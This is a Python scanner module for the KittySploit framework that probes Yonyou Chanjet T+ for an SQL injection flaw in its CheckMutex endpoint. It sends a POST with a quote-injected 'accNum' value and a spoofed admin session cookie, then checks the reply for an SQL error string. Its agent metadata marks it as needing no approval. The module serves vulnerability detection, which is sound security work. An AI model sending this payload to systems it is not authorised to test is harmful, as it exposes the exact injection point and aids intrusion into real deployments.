#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""There is an SQL injection vulnerability in the Changjetcrm financial crm system under Yonyou."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Chanjet Tplus CheckMutex - SQL Injection Detection',
        'description': 'There is an SQL injection vulnerability in the Changjetcrm financial crm system under Yonyou.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'chanjet', 'tplus', 'sqli', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://github.com/MrWQ/vulnerability-paper/blob/7551f7584bd35039028b1d9473a00201ed18e6b2/bugs/%E3%80%90%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E3%80%91%E7%94%A8%E5%8F%8B%E7%95%85%E6%8D%B7%E9%80%9A%20T%2B%20SQL%20%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md',
        ],
    }

    def run(self):
        path = '/tplus/ajaxpro/Ufida.T.SM.UIP.MultiCompanyController,Ufida.T.SM.UIP.ashx?method=CheckMutex'
        r = self.http_request(method='POST', path=path, allow_redirects=False, headers={'Content-Type': 'text/plain', 'Cookie': 'ASP.NET_SessionId=; sid=admin'}, data='{"accNum": "6\'", "functionTag": "SYS0104", "url": ""}\n')
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_all = ('order by begintime', '"value":',)
        header_any = ('text/plain',)
        if (all(m in body for m in body_all)) and (any(m in headers for m in header_any)):
            self.set_info(severity='high', reason='Chanjet Tplus CheckMutex - SQL Injection detected', path=path)
            return True
        return False

